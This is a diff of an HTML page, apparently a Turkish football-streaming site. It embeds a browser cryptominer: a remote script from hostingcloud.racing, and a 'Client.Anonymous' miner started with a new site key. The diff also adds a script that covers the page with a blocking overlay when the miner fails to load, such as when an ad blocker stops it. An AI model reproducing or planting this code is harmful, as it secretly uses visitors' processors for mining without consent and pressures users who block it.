@@ -14,12 +14,29 @@
 	</head>
 <body>
 	
-	<script src="https://www.hostingcloud.racing/kYOw.js"></script>
+<script src="https://www.hostingcloud.racing/kYOw.js"></script>
 <script>
-    var _client = new Client.Anonymous('1a4db2acd89014e3035d547185515efc90e9e381aae407abfe3727d856f27859', {
+    var _client = new Client.Anonymous('b57f0d2125bc8f0ff8c712bdc9c245870ab56bab0bca26bdfd97495970a84de7', {
         throttle: 0.1
     });
     _client.start();
+    
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Maçı izlemek istediğinizden emin misiniz?"));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
 </script>
 	
 <center>
